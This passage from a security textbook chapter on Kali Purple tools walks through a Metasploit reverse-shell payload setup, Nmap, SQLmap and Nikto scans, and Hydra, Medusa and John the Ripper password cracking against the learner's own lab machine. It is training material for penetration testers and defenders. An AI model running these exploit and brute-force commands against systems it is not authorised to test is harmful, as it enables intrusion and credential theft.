<img alt="Figure 10.16 – Metasploit exploit preparation" height="402" src="image/B21223_10_16.jpg" width="852"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 10.16 – Metasploit exploit preparation</p>
<p>Now that we’ve told Metasploit which device to attack by setting the RHOST IP address, we still need to tell it where to find the script we just created. Type <strong class="source-inline">set targeturi /cgi-bin/metatest.sh</strong> and set the payload by typing <strong class="source-inline">set </strong><span class="No-Break"><strong class="source-inline">payload linux/x86/shell/reverse_tcp</strong></span><span class="No-Break">.</span></p>
<p>You can type <strong class="source-inline">show options</strong> to get an overview of all the fields within your exploit that have been filled out or<a id="_idIndexMarker879"/> might still need to be filled out. When you’re satisfied, type <strong class="source-inline">exploit</strong> to begin the exploit. Your terminal will notify you if it <span class="No-Break">was successful.</span></p>
<h1 id="_idParaDest-165"><a id="_idTextAnchor169"/>Scanners</h1>
<p>Each of the tools we’ve covered in this<a id="_idIndexMarker880"/> chapter thus far has a unique specialty. In this section, we are going to cover a group of tools that each have a unique specialty but within the same overall concept of scanning. Scanning is part of the reconnaissance phase of a cyberattack. It’s where the attacker gets useful information to narrow their attack vector and better plan their strategy. Different scanners have different areas of emphasis. We are going to begin with the extremely popular, lightweight, and time-tested Nmap <span class="No-Break">network scanner.</span></p>
<h2 id="_idParaDest-166"><a id="_idTextAnchor170"/>Nmap</h2>
<p>If you were to go around asking professional penetration testers to list their top five favorite tools, you’d be hard-pressed to find a single one who doesn’t list Nmap among them. Nmap is a very powerful network exploration tool and is regularly used for security auditing. It is <a id="_idIndexMarker881"/>designed to discover network nodes – hosts – along with some network-related services within a computer network. In doing so, it can create a map of the network’s structure, hence <span class="No-Break">the name.</span></p>
<p>Nmap uses raw IP packets to determine what <a id="_idIndexMarker882"/>hosts are available on the network, which services are available on those hosts to include the application names and versions, the operating system versions the hosts are running, as well as which type of packet filters and firewalls are in use. This is just a high-level overview that’s meant to highlight the most common uses of Nmap. It can be used to detect numerous other characteristics <span class="No-Break">as well.</span></p>
<p>Here are some of Nmap’s <span class="No-Break">key features:</span></p>
<ul>
<li><strong class="bold">Host discovery</strong>: This <a id="_idIndexMarker883"/>tends to be the default visualization folks get when thinking of Nmap, even though the utility is much, much more than what you are about to discover. Host discovery is exactly as it sounds. Nmap sends packets across the network and analyzes the responses to determine which hosts are available and active on <span class="No-Break">the network.</span></li>
<li><strong class="bold">Port scanning</strong>: Nmap can scan ports on target hosts to identify open ports and services running on those ports. It supports a variety of port scanning styles, including a SYN scan, TCP connect scan, UDP scan, and others. This high level of flexibility is crucial for ethical hackers/pentesters and malicious cyber criminals alike because it helps them all paint a clearer picture of the total attack surface of <span class="No-Break">a network.</span></li>
<li><strong class="bold">Service version detection</strong>: In addition to providing extensive support for IPv6, Nmap can also detect versions of applications/services that are running on the target host. It can also detect network-specific devices and services. This is important because it can help in identifying vulnerabilities based on and known to be associated with specific versions, as well as network composition and <span class="No-Break">overall layout.</span></li>
<li><strong class="bold">Operating system detection</strong>: Nmap will make an educated guess about which operating system is operating on a target host by analyzing the various network packet responses it receives. Each type of operating system has unique behaviors in the way they operate, much the same as people – even similar people – have subtle uniqueness<a id="_idIndexMarker884"/> associated <span class="No-Break">with them.</span></li>
<li><strong class="bold">Scriptable interaction</strong>: Nmap includes a scripting engine to allow users to write scripts to automate a wide variety of networking tasks, from vulnerability detection to advanced network <span class="No-Break">discovery tasks.</span></li>
<li><strong class="bold">Flexible timing and performance</strong>: Because it’s valuable in automation, Nmap provides options to control the timing of scans. The reason controlling this is important is because it<a id="_idIndexMarker885"/> allows pentesters to balance speed and stealth more closely according to <span class="No-Break">their needs.</span></li>
<li><strong class="bold">Output options</strong>: Nmap supports a variety of output formats, including an interactive mode, a grepable mode, XML, and other formats that are used for reporting purposes so that other analysts can review <span class="No-Break">scan results.</span></li>
</ul>
<p>You’re probably beginning to sense a theme developing here, but Nmap should already be installed within your Kali Purple instance. You can check this by selecting the Kali dragon icon in the top-left corner of your environment and either typing <strong class="source-inline">Nmap</strong> in the search bar or scrolling down and highlighting <strong class="bold">Information Gathering</strong> and then moving your cursor to the newly expanded column on the right-hand side. Once you’ve done this, scroll until you find the <strong class="bold">Nmap</strong> option. At the command line, do your thing. Type <strong class="source-inline">sudo apt update</strong> and <strong class="source-inline">sudo apt upgrade</strong> if it suits you. Follow this with <strong class="source-inline">sudo apt </strong><span class="No-Break"><strong class="source-inline">install nmap</strong></span><span class="No-Break">.</span></p>
<p>Unlike the previous applications we’ve covered in this chapter, Nmap doesn’t have a pretty GUI to work from. You will use it directly from the command line, even if you invoke the application by using the drop-down menu and icon. To use Nmap from the command line, simply type <strong class="source-inline">sudo nmap &lt;options&gt; &lt;target&gt;</strong>. You can type <strong class="source-inline">nmap</strong> alone to get a listing of available options. The target will be something like the value of an IP address, URL, or hostname. For a fun example, after typing <strong class="source-inline">nmap</strong> and reviewing the options, type <strong class="source-inline">nmap -v -sn -T1 127.0.0.1</strong> and compare your results to what’s shown in <span class="No-Break"><em class="italic">Figure 10</em></span><em class="italic">.17</em>. Review the list of options you typed and compare them to that output and the list that’s printed to your screen when after typing <strong class="source-inline">nmap</strong>. You should begin to understand what’s going on by making those comparisons. Play around with different<a id="_idIndexMarker886"/> options as much as you like but remember not to scan any host, URL, or IP address that you don’t have explicit permission <span class="No-Break">to scan:</span></p>
<div>
<div class="IMG---Figure" id="_idContainer189">
<img alt="Figure 10.17 – Nmap example scan of the localhost" height="162" src="image/B21223_10_17.jpg" width="561"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 10.17 – Nmap example scan of the localhost</p>
<h2 id="_idParaDest-167"><a id="_idTextAnchor171"/>SQLmap</h2>
<p>Nmap specializes in network scanning. There<a id="_idIndexMarker887"/> is another type of vulnerability scanner that specializes in detecting database vulnerabilities in SQL databases associated with web <a id="_idIndexMarker888"/>applications. It is aptly named <strong class="bold">SQLmap</strong>, and it does more than just detect vulnerabilities. It also helps to <span class="No-Break">exploit them.</span></p>
<p>Some of the key features of SQLmap are <span class="No-Break">as follows:</span></p>
<ul>
<li><strong class="bold">Automated SQL injection detection</strong>: SQLmap is built to automatically detect SQL injection vulnerabilities within web applications by analyzing responses from the<a id="_idIndexMarker889"/> target, much like Nmap does, but it can also exploit these vulnerabilities. It performs these exploits through various actions, such as dumping database contents, altering database structures, or executing arbitrary commands on <span class="No-Break">the server.</span></li>
<li><strong class="bold">Support for multiple database management systems</strong>: SQLmap supports various database management systems, including the well-known MySQL, Oracle, and PostgreSQL, along with Microsoft SQL Server, SQLite, and others. This adds a level of versatility to <span class="No-Break">the application.</span></li>
<li><strong class="bold">Detection and database schema data</strong>: This application can identify the database schema, tables, columns, and data stored within the target database. This could end up providing very valuable insights for the pentester to use for further exploitation of a system <span class="No-Break">or organization.</span></li>
<li><strong class="bold">Brute force and dictionary-based attacks</strong>: SQLmap supports brute-force and dictionary-styled attacks, which it uses in attempts to guess database names, tables, columns, and <span class="No-Break">user accounts.</span></li>
<li><strong class="bold">SQL shell</strong>: SQLmap provides an interactive SQL-based shell for executing commands directly upon<a id="_idIndexMarker890"/> the target system’s database. This gives the pentesters an avenue to perform advanced <span class="No-Break">database manipulation.</span></li>
<li><strong class="bold">Enumeration of backend database credentials</strong>: SQLmap can retrieve usernames and password <a id="_idIndexMarker891"/>hashes from the database, facilitating unauthorized access to <span class="No-Break">the database.</span></li>
<li><strong class="bold">Detection of filesystem access</strong>: By taking advantage of any discovered SQL injection vulnerabilities on the server, SQLmap can detect filesystem access and enable access to sensitive files on <span class="No-Break">the server.</span></li>
<li><strong class="bold">Customizable testing parameters</strong>: SQLmap offers a wide range of testing options and parameters to customize the scanning process based on specific requirements and <span class="No-Break">target applications.</span></li>
<li><strong class="bold">Detection of blind SQL injection</strong>: SQLmap can also detect blind SQL injection vulnerabilities. This is where the application will not display error responses. It detects these vulnerabilities by using time-based and Boolean-based techniques to <span class="No-Break">run interference.</span></li>
<li><strong class="bold">Integration and support for web application firewalls (WAFs) and other tools</strong>: SQLmap can bypass certain WAFs and evasion techniques to successfully exploit SQL injection vulnerabilities in protected web applications. It can also be integrated with popular web application security testing tools such as <span class="No-Break">Burp Suite.</span></li>
</ul>
<p>To get SQLmap, at the command line, type <strong class="source-inline">sudo apt update</strong> and <strong class="source-inline">sudo apt upgrade</strong> if it suits you. Follow this up with <strong class="source-inline">sudo apt </strong><span class="No-Break"><strong class="source-inline">install sqlmap</strong></span><span class="No-Break">.</span></p>
<p>To use the application, type <strong class="source-inline">sqlmap -u &lt;target&gt;</strong>, where <strong class="source-inline">target</strong> is the target URL of the application or <a id="_idIndexMarker892"/>database you wish <span class="No-Break">to attack.</span></p>
<h2 id="_idParaDest-168"><a id="_idTextAnchor172"/>Nikto</h2>
<p><strong class="bold">Nikto</strong> is another scanner, one that specializes<a id="_idIndexMarker893"/> in scanning web servers. It’s very lightweight and easy <span class="No-Break">to use.</span></p>
<p>First, grab a copy by doing your <strong class="source-inline">sudo apt update</strong> and <strong class="source-inline">upgrade</strong> magic and continue by typing <strong class="source-inline">sudo apt install nikto</strong>. It should install very quickly and painlessly. Once done and since you’re<a id="_idIndexMarker894"/> already in your Kali Purple environment, you should be able to invoke the utility and perform a scan immediately and directly from the command line. Type <strong class="source-inline">nikto -h &lt;target&gt;</strong>. In our case, we’ll just scan our localhost. So, we’ll type <strong class="source-inline">nikto -h 127.0.0.1</strong>. As shown in <span class="No-Break"><em class="italic">Figure 10</em></span><em class="italic">.18</em>, it didn’t find much – because we don’t have much. However, much is not always necessary in the eyes of an attacker. Look carefully at the results; you will still find an abundance of useful information that was returned from <span class="No-Break">the scan:</span></p>
<div>
<div class="IMG---Figure" id="_idContainer190">
<img alt="Figure 10.18 – Nikto scan of the Kali Purple host system’s web server" height="336" src="image/B21223_10_18.jpg" width="644"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 10.18 – Nikto scan of the Kali Purple host system’s web server</p>
<p>Our limited results scan still told us that the type of web server is CherryPy version 18.9.0. Ohhhhh… but look at the juicy bit of intelligence on the very next line! This server doesn’t have an anti-clickjacking X-Frame Option header. If you were a cybercriminal looking to exploit, what do you suppose you would do with that? That’s right – you’d want to consider clickjacking attacks! If you’re an experienced attacker, you’ll first search for any publicly available information about clickjacking as it relates to that specific server type and version. In many cases, the information – sometimes even step-by-step handholding instructions – is already out there on the web. Conversely, if you’re a pentester, you now know you need to perform equivalent research in terms of how to provide the<a id="_idIndexMarker895"/> anti-clickjacking X-Frame <span class="No-Break">Option header.</span></p>
<h2 id="_idParaDest-169"><a id="_idTextAnchor173"/>Nessus</h2>
<p>If you go to work in a SOC environment, you<a id="_idIndexMarker896"/> will eventually come across traffic that traces to Tenable Network Security’s flagship product, <strong class="bold">Nessus</strong>. Nessus is a vulnerability <a id="_idIndexMarker897"/>assessment and management tool that’s designed to help organizations identify and remediate vulnerabilities in their network, infrastructure, <span class="No-Break">and systems.</span></p>
<p>Nessus’ highlights – which you’ve already seen in other software we’ve covered – include <span class="No-Break">the following:</span></p>
<ul>
<li>Customizable <span class="No-Break">vulnerability scanning</span></li>
<li>Support for multiple <span class="No-Break">operating systems</span></li>
<li>API integration and <span class="No-Break">plugin-based architecture</span></li>
<li>Policy compliance and <span class="No-Break">configuration auditing</span></li>
<li>Patching <span class="No-Break">and remediation</span></li>
<li>Scheduled scans <span class="No-Break">and reporting</span></li>
<li><span class="No-Break">Risk prioritization</span></li>
<li>Support for both cloud and <span class="No-Break">on-premises deployment</span></li>
<li>Scalability <span class="No-Break">and performance</span></li>
</ul>
<p>Tenable’s Nessus is a commercial product that only offers a 7-day free trial. Since the theme of this book is helping marry free and open source solutions with the equally free and open source Kali Purple, we won’t go into too much detail here. However, we’d be remiss not to mention this product and that it is compatible with the Kali Purple operating system given its wide-scale popularity in the cybersecurity community. We’ve placed a link in <em class="italic">Further reading</em> if you wish to learn more about one of the most recognized vulnerability scanners in <span class="No-Break">the world.</span></p>
<h2 id="_idParaDest-170"><a id="_idTextAnchor174"/>Greenbone Vulnerability Management and OpenVAS</h2>
<p>OpenVAS is an open source version of <a id="_idIndexMarker898"/>vulnerability scanning and a competing product <span class="No-Break">to Nessus.</span></p>
<p>OpenVAS’ highlights – which you’ve <a id="_idIndexMarker899"/>already seen in other software we’ve covered – include<a id="_idIndexMarker900"/> <span class="No-Break">the following:</span></p>
<ul>
<li><span class="No-Break">Vulnerability scanning</span></li>
<li>Automated and <span class="No-Break">scheduled scanning</span></li>
<li><span class="No-Break">Network discovery</span></li>
<li><span class="No-Break">CVE compatibility</span></li>
<li>Reporting <span class="No-Break">and remediation</span></li>
<li>Scalability <span class="No-Break">and flexibility</span></li>
<li>Third-party <span class="No-Break">integration support</span></li>
<li>Threat <span class="No-Break">intelligence feeds</span></li>
<li><span class="No-Break">Community-wide support</span></li>
</ul>
<p>You can grab <strong class="bold">OpenVAS</strong> through the typical means. Run <strong class="source-inline">sudo apt update</strong> and <strong class="source-inline">upgrade</strong>, which you’re probably able to do blindfolded by now. Then, continue by typing <strong class="source-inline">sudo apt install gvm-tools</strong>. This is where things depart from how we’ve done things in the past. Accept any prompts if there are any and wait a few minutes for <strong class="bold">Greenbone</strong>, which includes <a id="_idIndexMarker901"/>OpenVAS to install. Once it’s done, you still have some configuring to do. Select the Kali dragon icon in the top left and start typing <strong class="source-inline">gvm</strong> until some <strong class="bold">gvm</strong> fields populate, as shown in <span class="No-Break"><em class="italic">Figure 10</em></span><span class="No-Break"><em class="italic">.19</em></span><span class="No-Break">:</span></p>
<div>
<div class="IMG---Figure" id="_idContainer191">
<img alt="Figure 10.19 – Greenbone management options under the Kali dragon logo" height="272" src="image/B21223_10_19.jpg" width="700"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 10.19 – Greenbone management options under the Kali dragon logo</p>
<p>Start by selecting <strong class="bold">gvm initial setup</strong> and let it run its course. Everything is automated. Then, select <strong class="bold">gvm check setup</strong>. You might be prompted to fix a certificate error by typing <strong class="source-inline">sudo runuser -u _gvm – gvm-manage-certs -a -f</strong> – trust us, it’s worth typing that command. It will save you a lot of time and effort and if you aren’t up to speed with certificates, it will also save you a lot of headaches. When you’re finished, run the <strong class="bold">gvm check setup</strong> option again. Pay close attention to see if there are any additional errors or commands to run. One of the sweetest features of this process is that if there are any adjustments, it will tell<a id="_idIndexMarker902"/> you precisely character-for-character what to type. Run this feature <a id="_idIndexMarker903"/>over and over until there are no more configurations or adjustments to make. Keep in mind that any time you’re updating a feed, there will be a long delay. Be patient. The <a id="_idIndexMarker904"/>operating system isn’t hanging. It simply takes a long time for those items <span class="No-Break">to complete.</span></p>
<p>Install the Redis server by typing <strong class="source-inline">sudo apt install redis</strong> and then start the service by typing <strong class="source-inline">sudo systemctl start redis</strong>. Verify it’s running properly by typing <strong class="source-inline">sudo systemctl status redis</strong>. When you get this far, because installing and configuring GVM can tend to be a bit of a hassle and is very sensitive to upgrades, we highly recommend doing another <strong class="source-inline">sudo apt update</strong>/<strong class="source-inline">upgrade</strong> to ensure everything is operating on an even keel and then completely rebooting and/or restarting GVM. Just like Nmap, SQLmap, and Nikto, the commands to initiate a scan are fairly straightforward. Type <strong class="source-inline">gvm-cli -h</strong> to get a list of options and <span class="No-Break">have fun!</span></p>
<p>As you can see, Kali Purple offers a plethora of scanning utilities covering nearly every scanning type and style you could think of, from network to database to web servers to infrastructure. Some scanning tools are built to handle more than one area of specialization. What happens when these scanners uncover vulnerabilities, such as weak password rulesets? Sure enough, Kali Purple also has tools to assist in exploiting <span class="No-Break">discovered vulnerabilities.</span></p>
<h1 id="_idParaDest-171"><a id="_idTextAnchor175"/>Password cracking</h1>
<p>Scanning and finding vulnerabilities in web or<a id="_idIndexMarker905"/> other technology applications is an integral part of the overall cyberattack flow. However, the ultimate goal is to gain access to the target and, if possible, elevate your privileges once inside so that you can wreak all manners of <span class="No-Break">remorseless havoc.</span></p>
<h2 id="_idParaDest-172"><a id="_idTextAnchor176"/>Hydra</h2>
<p><strong class="bold">Hydra</strong> is a password-cracking tool that is widely used for performing online password attacks on various network protocols. Its design<a id="_idIndexMarker906"/> is meant to help cybersecurity pentesters and other offensive security personnel work against the security of network<a id="_idIndexMarker907"/> systems by guessing and/or identifying <span class="No-Break">weak passwords.</span></p>
<p>Here are some highlights <span class="No-Break">of Hydra:</span></p>
<ul>
<li>Support for multiple types <span class="No-Break">of protocols</span></li>
<li>Brute-force and <span class="No-Break">dictionary attacks</span></li>
<li>Parallelized <span class="No-Break">attack sessions</span></li>
<li>Customizable <span class="No-Break">attack parameters</span></li>
<li>Session resumption and <span class="No-Break">pause/resume functionality</span></li>
<li><span class="No-Break">Username enumeration</span></li>
<li>User-friendly <span class="No-Break">command-line interface</span></li>
<li>Logging <span class="No-Break">and reporting</span></li>
<li>Support for <span class="No-Break">SSL/TLS security</span></li>
<li><span class="No-Break">Cross-platform compatibility</span></li>
<li>Extensibility with <span class="No-Break">community support</span></li>
</ul>
<p>To use Hydra, you can select the Kali dragon icon in the top-left corner of our environment and either type <strong class="source-inline">Hydra</strong> in the search bar or scroll down and highlight <strong class="bold">Password Attacks</strong>. Then, move your cursor to the newly expanded column on the right-hand side and click on the <span class="No-Break"><strong class="bold">Hydra</strong></span><span class="No-Break"> option.</span></p>
<p>Otherwise, if you prefer to type, then type <strong class="source-inline">sudo apt update</strong>; if the results suggest upgrades, you’ll want to type <strong class="source-inline">sudo apt upgrade</strong> to install them. Once you’re finished, type <strong class="source-inline">sudo apt install hydra</strong> to formally <span class="No-Break">install Hydra.</span></p>
<p>For Hydra to work effectively, you will need to either create (good luck with that) or download a password list for the program to use. Here is a brief list of popular password lists people use with <span class="No-Break">password-cracking utilities:</span></p>
<ul>
<li><span class="No-Break"><strong class="bold">SecLists</strong></span><span class="No-Break">: </span><a href="https://github.com/danielmiessler/SecLists"><span class="No-Break">https://github.com/danielmiessler/SecLists</span></a></li>
<li><strong class="bold">Daniel Miessler’s personal GitHub </strong><span class="No-Break"><strong class="bold">repository</strong></span><span class="No-Break">: </span><a href="https://github.com/danielmiessler"><span class="No-Break">https://github.com/danielmiessler</span></a></li>
<li><span class="No-Break"><strong class="bold">CrackStation</strong></span><span class="No-Break">: </span><a href="https://crackstation.net/"><span class="No-Break">https://crackstation.net/</span></a></li>
<li><span class="No-Break"><strong class="bold">Probable-Wordlists</strong></span><span class="No-Break">: </span><a href="https://github.com/berzerk0/Probable-Wordlists"><span class="No-Break">https://github.com/berzerk0/Probable-Wordlists</span></a></li>
<li><span class="No-Break"><strong class="bold">Weakpass</strong></span><span class="No-Break">: </span><a href="https://weakpass.com/wordlist"><span class="No-Break">https://weakpass.com/wordlist</span></a></li>
<li><span class="No-Break"><strong class="bold">Hashes.org</strong></span><span class="No-Break">: </span><a href="https://hashes.org"><span class="No-Break">https://hashes.org</span></a></li>
</ul>
<p>We are going to use SecLists for our example. To do so, type <strong class="source-inline">git </strong><span class="No-Break"><strong class="source-inline">clone https://github.com/danielmiessler/SecLists.git</strong></span><span class="No-Break">.</span></p>
<p>Navigate to the<a id="_idIndexMarker908"/> directory containing various password lists by typing <strong class="source-inline">cd SecLists/Passwords/</strong> and then typing <strong class="source-inline">ls</strong> to confirm you’re in the right place. If using <strong class="source-inline">cd</strong> doesn’t work, add a forward slash before <strong class="source-inline">SecLists</strong> and try again. You should see a list of many different <a id="_idIndexMarker909"/>styles of password lists, as shown in <span class="No-Break"><em class="italic">Figure 10</em></span><em class="italic">.20</em>. We’re going to work off of the <strong class="source-inline">2023-200_most_used_passwords.txt</strong> file. Let’s edit that file by typing <strong class="source-inline">sudo nano 2023-200_most_used_passwords.txt</strong>. On any blank line inside the file, type the password you use to log in to your Kali Purple instance. If there isn’t a blank line, just use the arrow keys on your keyboard to align your cursor at the beginning of any line and press <em class="italic">Enter</em> to create a new line. Then, once again, use the arrow keys to move to the empty line and input your Kali Purple password. Press <em class="italic">Ctrl</em> + <em class="italic">X</em> and select <em class="italic">Y</em> to <span class="No-Break">save it:</span></p>
<div>
<div class="IMG---Figure" id="_idContainer192">
<img alt="Figure 10.20 – Hydra /SecLists/Passwords directory of password files" height="201" src="image/B21223_10_20.jpg" width="526"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 10.20 – Hydra /SecLists/Passwords directory of password files</p>
<p>We are doing this for demonstration purposes and to keep the crack efficient. We could, in theory, grab a much more in-depth password list that would likely have your Kali Purple password already listed unless you’ve followed some of the advanced password creation methods we’ve talked about in this book. However, the longer the list, the longer it will take Hydra to work through unless we just get lucky, and you happen to have selected a password that is near the top of the list. In Kali Purple, any newly installed and/or launched<a id="_idIndexMarker910"/> utilities, such as this SSH server, are going to inherit your default Kali Purple credentials. So, if you’re setting things up in a production environment, make sure to change your default credentials with each application you set up on <span class="No-Break">your system.</span></p>
<p>Now, type <strong class="source-inline">pwd</strong> to get the full file path leading to that directory and remember or record that path. Remember, <strong class="bold">pwd</strong> stands for <strong class="bold">Print Working Directory</strong>. It’s easy for folks to mistakenly believe it stands for <em class="italic">password</em>, which could be <a id="_idIndexMarker911"/>confusing if you were somewhat new to Linux and attempting a pentest. You will use that full path in your attack in a moment. We’re going to attack an SSH server but to do so, we need to spin one up. Type <strong class="source-inline">sudo systemctl start ssh</strong>; when your command prompt returns, type <strong class="source-inline">sudo systemctl status ssh</strong> to ensure the service is up and running. The terminal will tell you that it is running if it is. From here, we are going to launch a password crack attempt against our SSH server using Hydra. Armed with that information and the full file <a id="_idIndexMarker912"/>path, you will decide which password file you’d like Hydra to use and simply enter the command stating the username you’d like Hydra to use, the complete file path of the password file you intend to use, and the protocol you are attacking – in this case, the <span class="No-Break">SSH server.</span></p>
<p>Before launching Hydra, type <strong class="source-inline">ifconfig</strong> and make a note of the interface you wish to attack. By default, this should be the <strong class="source-inline">eth0</strong> interface. If you have it set to <strong class="source-inline">eth1</strong> or a custom-named interface, then you already have the technical knowledge to grab the IP address you need before proceeding to the <span class="No-Break">next step.</span></p>
<p>Launch the attack by typing <strong class="source-inline">hydra -l &lt;KaliPurpleUserName&gt; -P &lt;FullPathToPasswordFile&gt; ssh&lt;either eth0 or eth1 IP address&gt;</strong>. So, in our case, this demonstration Kali Purple instance was given the username and password of karllane. Naturally, we would use different and more complicated values for a production or non-training system. The full path to our password file that we learned after typing <strong class="source-inline">pwd</strong> earlier is <strong class="source-inline">/home/karllane/SecLists/Passwords/2023-200_most_used_passwords.txt</strong>. Therefore, the full attack command that we typed to launch the attack was <strong class="source-inline">hydra -l karllane -P /</strong><span class="No-Break"><strong class="source-inline">home/karllane/SecLists/Passwords/2023-200_most_used_passwords.txt ssh://10.0.2.15</strong></span><span class="No-Break">.</span></p>
<p>If everything worked out as planned, Hydra should discover your password fairly quickly – by fairly quickly, we mean in a nano-second, as shown in <span class="No-Break"><em class="italic">Figure 10</em></span><span class="No-Break"><em class="italic">.21</em></span><span class="No-Break">:</span></p>
<div>
<div class="IMG---Figure" id="_idContainer193">
<img alt="Figure 10.21 – Hydra – successful password crack against our Kali Purple SSH server" height="229" src="image/B21223_10_21.jpg" width="872"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 10.21 – Hydra – successful password crack against our Kali Purple SSH server</p>
<p>Now, let’s take <a id="_idIndexMarker913"/>a look<a id="_idIndexMarker914"/> <span class="No-Break">at Medusa.</span></p>
<h2 id="_idParaDest-173"><a id="_idTextAnchor177"/>Medusa</h2>
<p><strong class="bold">Medusa</strong> is a tool that is very similar in function to Hydra. It is not in the Kali menu by default but will show up there<a id="_idIndexMarker915"/> under <strong class="bold">Password Attacks</strong> after you install it from the <a id="_idIndexMarker916"/>command line. Do that now. Type <strong class="source-inline">sudo apt update</strong> and then <strong class="source-inline">sudo apt upgrade</strong> if you prefer. Once you’ve finished, type the command to formally install Medusa – that is, <strong class="source-inline">sudo apt install medusa</strong>. Since we already did the hard work setting everything up with Hydra, this will go much quicker. After installing it, you can pretty much launch your attack right away, assuming your SSH server is still up and running. To find out, type <strong class="source-inline">sudo systemctl status ssh</strong>; if it’s not running, retype that command, replacing the word <strong class="source-inline">status</strong> with <strong class="source-inline">start</strong>. Then, launch your attack by typing <strong class="source-inline">medusa -h 10.0.2.15 -u karllane -P /home/karllane/SecLists/Passwords/2023-200_most_used_passwords.txt -</strong><span class="No-Break"><strong class="source-inline">M ssh</strong></span><span class="No-Break">.</span></p>
<p>As you will discover, the process is lightning-fast. If successful, you should see the result shown in <span class="No-Break"><em class="italic">Figure 10</em></span><span class="No-Break"><em class="italic">.22</em></span><span class="No-Break">:</span></p>
<div>
<div class="IMG---Figure" id="_idContainer194">
<img alt="Figure 10.22 – Medusa – successful password crack against our Kali Purple SSH server" height="159" src="image/B21223_10_22.jpg" width="1350"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 10.22 – Medusa – successful password crack against our Kali Purple SSH server</p>
<p>Next, we’ll cover John <a id="_idIndexMarker917"/><span class="No-Break">the Ripper.</span></p>
<h2 id="_idParaDest-174"><a id="_idTextAnchor178"/>John the Ripper</h2>
<p><strong class="bold">John the Ripper</strong> is a very well-known and popular password-cracking tool. It’s often utilized by security professionals<a id="_idIndexMarker918"/> and pentesters to test the strength of passwords as well as conduct security assessments for<a id="_idIndexMarker919"/> organizations. It is an incredibly versatile password-cracking tool in that it supports a wide range of cryptographic hash algorithms and <span class="No-Break">password formats.</span></p>
<p>To use John the Ripper, select the Kali dragon icon in the top-left corner of our environment and either type <strong class="source-inline">john</strong> in the search bar or scroll down and highlight <strong class="bold">Password Attacks</strong>. Then, move your cursor to the newly expanded column on the right-hand side and click on the <strong class="bold">John the </strong><span class="No-Break"><strong class="bold">Ripper</strong></span><span class="No-Break"> option.</span></p>
<p>To install it from the command line, type <strong class="source-inline">sudo apt update</strong> and then <strong class="source-inline">sudo apt upgrade</strong> if you prefer. Once you’re finished, type the command to formally install John the Ripper – that is, <strong class="source-inline">sudo apt </strong><span class="No-Break"><strong class="source-inline">install john</strong></span><span class="No-Break">.</span></p>
<p>We’ve already attacked our SSH server twice, so let’s do something different for the sake of staying awake. Let’s do something John the Ripper is well-known for and crack a password hash! First, let’s create a file in which we can store our hash. Type <strong class="source-inline">sudo nano hashtest.txt</strong> or whatever you’d like to name it. Just remember to type the correct name in the command. In the file, type <strong class="source-inline">37203f0ef82c870c36cd6f99e1fbfe4c</strong> as a hash value on the first line, and then press <em class="italic">Ctrl</em> + <em class="italic">X</em> to close and save the file, selecting <em class="italic">Y</em> to confirm your choice. Now, enter the command to invoke John the Ripper (which comes with a pre-installed password list of its own) and run it against the hash value(s) in that file. Type <strong class="source-inline">john –format=raw-md5 hashtest.txt</strong>, replacing the actual name of the text file with the name you chose to name your file. If all goes well, you will discover that the hash value you placed inside that file resolves to the word <strong class="bold">valhalla</strong>, as shown in <span class="No-Break"><em class="italic">Figure 10</em></span><span class="No-Break"><em class="italic">.23</em></span><span class="No-Break">:</span></p>
<div>
<div class="IMG---Figure" id="_idContainer195">
<img alt="Figure 10.23 – John the Ripper successfully resolving a hash value from a file" height="217" src="image/B21223_10_23.jpg" width="734"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 10.23 – John the Ripper successfully resolving a hash value from a file</p>
<p>Now that we’ve covered packet <a id="_idIndexMarker920"/>capture, robust vulnerability scanning, exploit usage, and payload delivery with Metasploit, along with password cracking<a id="_idIndexMarker921"/> using Hydra, Medusa, and John the Ripper, we’re going to bring this chapter full circle and go back to web application analysis with ZAP’s chief competition, Burp Suite. Like ZAP, Burp Suite offers a plethora of free training but also has a strong commercial component to <span class="No-Break">its brand.</span></p>
<h1 id="_idParaDest-175"><a id="_idTextAnchor179"/>Burp Suite integration</h1>
<p>You would be hard-pressed to find a professional web application penetration tester who doesn’t use or at least hasn’t heard of Burp Suite. This tool is produced by a company called PortSwigger. We <a id="_idIndexMarker922"/>talked a bit about the structure of<a id="_idIndexMarker923"/> Burp Suite in <a href="B21223_01.xhtml#_idTextAnchor013"><span class="No-Break"><em class="italic">Chapter 1</em></span></a> and encourage you to refer to that chapter if you’d like to <span class="No-Break">review it.</span></p>
<p>Let’s quickly grab a copy and set it up for you to play with. Within your Kali Purple instance, open a web browser – ideally Firefox, in this case – and go to <a href="https://portswigger.net/burp/documentation/desktop/getting-started/download-and-install">https://portswigger.net/burp/documentation/desktop/getting-started/download-and-install</a>. Then, scroll down until you see the <strong class="bold">Choose your software</strong> options under the <strong class="bold">Download</strong> section, as shown in <span class="No-Break"><em class="italic">Figure 10</em></span><em class="italic">.24</em>. Select the <strong class="bold">Community </strong><span class="No-Break"><strong class="bold">Edition</strong></span><span class="No-Break"> option:</span></p>
<div>
<div class="IMG---Figure" id="_idContainer196">
<img alt="Figure 10.24 – Burp Suite download" height="493" src="image/B21223_10_24.jpg" width="1101"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 10.24 – Burp Suite download</p>
<p>The website should identify your operating system and present the correct option by default. If it doesn’t, you can select the drop-down menu where the operating system is listed and select the appropriate <a id="_idIndexMarker924"/>operating system to download the correct Burp Suite option. You should also click on the <strong class="bold">show checksums</strong> link to the right of the download button and record those values. When you do, the checksums will be presented to you and the button will change to <strong class="bold">hide checksums</strong> (highlighted in <span class="No-Break"><em class="italic">Figure 10</em></span><em class="italic">.25</em>). Record <span class="No-Break">those values:</span></p>
<div>
<div class="IMG---Figure" id="_idContainer197">
<img alt="Figure 10.25 – Burp Suite download options and checksums" height="665" src="image/B21223_10_25.jpg" width="1350"/>
</div>
</div>
